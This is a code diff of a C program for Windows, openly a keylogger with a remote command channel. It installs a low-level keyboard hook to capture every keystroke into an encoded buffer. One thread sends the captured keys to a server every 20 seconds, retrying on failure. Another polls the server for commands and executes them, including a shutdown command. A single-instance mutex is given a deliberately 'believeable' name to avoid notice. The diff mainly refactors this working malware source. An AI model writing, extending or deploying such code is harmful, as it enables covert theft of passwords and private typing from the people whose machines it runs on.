@@ -19,20 +19,15 @@ PROGRAM_CONTEXT* progContext;
  */
 ERR_CODE setup() {
     progContext = initProgramContext(); // 1
-    if (progContext == NULL) 
-        return ECODE_NULL;
+    if (progContext == NULL) { return ECODE_NULL; }
 
     ERR_CODE ret = registerClient(progContext->client); // 2
-    if (ret != ECODE_SUCCESS) 
-        return ret;
+    if (ret != ECODE_SUCCESS) { return ret; }
 
     // 3 create threading mutex with a somewhat believeable name :)
     progContext->hMutexThreadSync = CreateMutexA(NULL, FALSE, "wint_hObj23:10");
-    if (progContext->hMutexThreadSync == NULL) 
-        return ECODE_NULL;
-
-    if (GetLastError() == ERROR_ALREADY_EXISTS) // 4 
-        return ECODE_SAFE_RET;
+    if (progContext->hMutexThreadSync == NULL) { return ECODE_NULL; } 
+    if (GetLastError() == ERROR_ALREADY_EXISTS) { return ECODE_SAFE_RET; } // 4 
 
     printf("\nPROGRAM_CONTEXT initialised...\n\n");
     return ECODE_SUCCESS;
@@ -44,8 +39,7 @@ ERR_CODE setup() {
  */
 PROGRAM_CONTEXT* initProgramContext() {
     PROGRAM_CONTEXT* prCon = (PROGRAM_CONTEXT *)malloc(sizeof(PROGRAM_CONTEXT));
-    if (prCon == NULL) 
-        return NULL;
+    if (prCon == NULL) { return NULL; }
 
     // create client structure
     prCon->client = initClient();
@@ -53,7 +47,6 @@ PROGRAM_CONTEXT* initProgramContext() {
         free(prCon);
         return NULL;
     }
-
     // create key logger structure
     prCon->kLogger = initKeyLogger();
     if (prCon->kLogger == NULL) {
@@ -61,14 +54,12 @@ PROGRAM_CONTEXT* initProgramContext() {
         free(prCon);
         return NULL;
     }
-
     // install the LowLevelKeyboardProc and set the hook
     prCon->hLowLevelKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, lowLevelKeyboardProc, NULL, 0);
     if (prCon->hLowLevelKeyHook == NULL) {
         programContextCleanup(prCon);
         return NULL;
     }
-
     prCon->mainThreadId = GetCurrentThreadId();
     prCon->hCmdThread = NULL;
     prCon->hWriteThread = NULL;
@@ -90,8 +81,9 @@ ERR_CODE startThreads() {
     // update the program context
     progContext->hCmdThread = hCmdThr;
     progContext->hWriteThread = hWriteThr;
-    if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) 
+    if (progContext->hCmdThread == NULL || progContext->hWriteThread == NULL) {
         return ECODE_NULL;
+    }
     
     ERR_CODE ret = runKeyLogger();
 
@@ -104,11 +96,8 @@ ERR_CODE startThreads() {
 }
 
 /**
- * function that executes infinitely until shd command is given. 
+ * function that executes infinitely until `shd` command is given. 
  * Each iteration it retrieves the remote commands and then executes them!
- * 
- * Important note: if the there were no commands recieved, then don't do anything
- * to limit network activity.
  */
 DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
     while (!progContext->shutdown) {
@@ -119,13 +108,13 @@ DWORD WINAPI commandsAndBeaconThread(LPVOID lpParam) {
 
         // get the commands from the server
         ERR_CODE ret = pollCommandsAndBeacon(client);
-        if (ret != ECODE_SUCCESS) printf("ECODE: %s\n", getErrMessage(ret));
+        if (ret != ECODE_SUCCESS) { printErr(ret); }
         
         // only try and execute the commands if there is something to exec.
         if (strlen(client->cmdBuffer) > 0) {
-            ret = executeCommands(client);
-            if (ret == ECODE_DO_SHUTDOWN) doShutdown();
-            if (ret != ECODE_SUCCESS)     printf("ECODE: %s\n", getErrMessage(ret));
+            ret = processCommands(client);
+            if (ret == ECODE_DO_SHUTDOWN) { doShutdown(); }
+            if (ret != ECODE_SUCCESS)     { printErr(ret); }
         }
         ReleaseMutex(progContext->hMutexThreadSync);
     }
@@ -138,11 +127,14 @@ void doShutdown() {
     PostThreadMessageA(progContext->mainThreadId, WM_QUIT, 0, 0);
 }
 
+
 /**
  * Function that executes infinitely until shd command is given. 
- * Every 10 seconds it attempts to write the captured keys to the server logs
+ * Every 20 seconds it attempts to write the captured keys to the 
+ * server logs, if th write fails then it tries two more times.
+ * Then resets the kLogger
  * 
- * Important note: similar to before, if the key buffer is empty, then don't 
+ * Important note: if the key buffer is empty, then don't 
  * do anything to limit network activity.
  */
 DWORD WINAPI writeLogThread(LPVOID lpParam) {
@@ -150,27 +142,30 @@ DWORD WINAPI writeLogThread(LPVOID lpParam) {
         Sleep(SLP_WRITER_THREAD);
 
         WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
+        
         KEY_LOGGER* kLogger = progContext->kLogger;
-
-        // skip the write if the buffer is empty
-        if (kLogger->bufferPtr == 0)
-            goto skipWrite;
-
-        // tries the to write the key buffer, if the post request failed try at max 2 times more
-        int ret = writeKeyLog(progContext->client, kLogger->keyBuffer, (kLogger->bufferPtr) - 1);
-        int i = 1;
-        while (ret == ECODE_POST && ++i <= 3)
-            ret = writeKeyLog(progContext->client, kLogger->keyBuffer, (kLogger->bufferPtr) - 1);
-
-        if (ret == ECODE_SUCCESS) {
-            // reset buffer ptr, no need to reset the buffer memory
-            kLogger->bufferPtr = 0;
-            kLogger->keyBuffer[0] = '\0';
-        } else {
-            printf("ECODE: %d\n", ret);
+        if (kLogger->bufferPtr == 0) { 
+            // skip the write if the buffer is empty
+            goto skipWrite; 
         }
 
-        skipWrite:
+        CLIENT_HANDLER* client = progContext->client;
+        char* buffer = kLogger->keyBuffer;
+        unsigned int writeSize = (kLogger->bufferPtr) - 1;
+
+        // tries the to write the key buffer at max 3 times
+        int ret = ECODE_POST;
+        for (int i = 1; i < 3 && ret == ECODE_POST; i++) {
+            ret = writeKeyLog(client, buffer, writeSize);
+        }
+
+        if (ret != ECODE_SUCCESS) { printErr(ret); }
+        
+        kLogger->bufferPtr = 0;
+        kLogger->keyBuffer[0] = '\0';
+        kLogger->encKey = ENC_KEY;  // make sure to reset the encoding key state
+
+        skipWrite: 
         ReleaseMutex(progContext->hMutexThreadSync);
     }
     return 0;
@@ -198,6 +193,9 @@ ERR_CODE runKeyLogger() {
  * SetWindowsHookExA function
  */
 LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    // by waiting for the mutex we can ensure keys are not captured during slp command
+    WaitForSingleObject(progContext->hMutexThreadSync, INFINITE);
+
     KBDLLHOOKSTRUCT *keyPress = (KBDLLHOOKSTRUCT *)lParam;
     DWORD vkCode = keyPress->vkCode;
 
@@ -205,18 +203,18 @@ LRESULT CALLBACK lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     // this step does not allow shift capslock nor numlock to be put on the buffer.
     // then skip all state update keys and non key down events
     BOOL wasUpdated = updateKeyLoggerState(progContext->kLogger, wParam, &vkCode);
-    if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP)
+    if (wasUpdated || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+        ReleaseMutex(progContext->hMutexThreadSync);
         return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
+    }
     
     ERR_CODE ret = addKeyPressToBuffer(progContext->kLogger, &vkCode);
     if (ret == ECODE_FULL_BUFF) {
         // do something?
     }
     printf("%s\n", progContext->kLogger->keyBuffer);
-    encode(progContext->kLogger->keyBuffer);
-    printf("ENCODE: %s\n", progContext->kLogger->keyBuffer);
-    encode(progContext->kLogger->keyBuffer);
-    printf("DECODE: %s\n\n", progContext->kLogger->keyBuffer);
+
+    ReleaseMutex(progContext->hMutexThreadSync);
     return CallNextHookEx(progContext->hLowLevelKeyHook, nCode, wParam, lParam);
 }
 
@@ -236,27 +234,23 @@ void programCleanup() {
 void programContextCleanup(PROGRAM_CONTEXT* prCon) {
     if (prCon == NULL) return;
 
-    // free allocated memory
-    if (prCon->client != NULL)   // free the client
-        clientCleanup(prCon->client);
-    if (prCon->kLogger != NULL)  // free the keylogger
-        keyLoggerCleanup(prCon->kLogger);
-
-    // free the 
-    if (prCon->hLowLevelKeyHook != NULL)
+    // free the client
+    if (prCon->client != NULL) { clientCleanup(prCon->client); }
+    // free the keylogger
+    if (prCon->kLogger != NULL) { keyLoggerCleanup(prCon->kLogger); }
+    
+    //unhook keyboard events
+    if (prCon->hLowLevelKeyHook != NULL) {
         UnhookWindowsHookEx(prCon->hLowLevelKeyHook);
+    }
 
     // close thread handles
-    if (prCon->hCmdThread != NULL) 
-        CloseHandle(prCon->hCmdThread);
-    if (prCon->hWriteThread != NULL)
-        CloseHandle(prCon->hWriteThread);
+    if (prCon->hCmdThread != NULL) { CloseHandle(prCon->hCmdThread); }
+    if (prCon->hWriteThread != NULL) { CloseHandle(prCon->hWriteThread); }
 
     // close mutex handle
-    if (prCon->hMutexThreadSync != NULL)
-        CloseHandle(prCon->hMutexThreadSync);
+    if (prCon->hMutexThreadSync != NULL) { CloseHandle(prCon->hMutexThreadSync); }
     
-    // free memory
     free(prCon);
 }
 
